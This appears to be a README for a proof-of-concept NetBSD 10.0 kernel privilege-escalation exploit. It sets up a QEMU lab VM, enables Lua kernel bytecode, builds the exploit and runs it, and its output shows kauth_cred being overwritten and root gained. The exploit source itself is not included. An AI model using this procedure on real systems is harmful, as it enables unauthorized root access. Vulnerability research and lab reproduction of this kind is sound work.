# Set Up

1. Download the NetBSD 10.0 ISO image or build from source
2. Create qemu disk:

```
qemu-img create disk.img 10G
```

3. Run the VM:

```
qemu-system-x86_64 -smp 2 -drive file=$PWD/disk.img,format=raw \
  -cdrom ~/Downloads/NetBSD-10.0-amd64.iso -m 1024 \
  -gdb tcp::4321 -net user,hostfwd=tcp::5022-:22 \
  -net nic
```

4. Install the operation system
  - Select "Installation without X11" (unless you want the GUI)
  - Select "Enable sshd"
  - Select "Add a user"
    - "Add user to group wheel" -> Yes
  - Reboot


5. Connect to the VM and set up Lua/connectivity with host:

```
$ whoami 
root

$ dhcpcd -w 

$ modload lua
$ modload luasystm
$ sysctl -w kern.lua.bytecode=1
```

6. Transfer the exploit source to the VM:
  - Replace `user` with the username you created during set up

```
$ scp -P 5022 \
  ./src/* \
  ./luac/stage1.luac \
  ./luac/stage2.luac \
  ./build.sh \
  user@localhost:/home/user/

```

7. Build exploit (inside the VM)

```
$ chmod +x ./build.sh
$ ./build.sh
```

8. Run the exploit:

```
$ whoami
user

$ groups
users wheel

$ ./elevate
...
[+] Spawned pid=1484
[+] Waiting for signal...
[+] Signalling parent...
[+] Overwriting kauth_cred
[+] Waiting for child to complete
[+] Waiting for 5s...
[+] Cleaning up...
[+] Executing ./getroot

# id
uid=0(root) gid=0(wheel) groups=100(users),0(wheel)
```
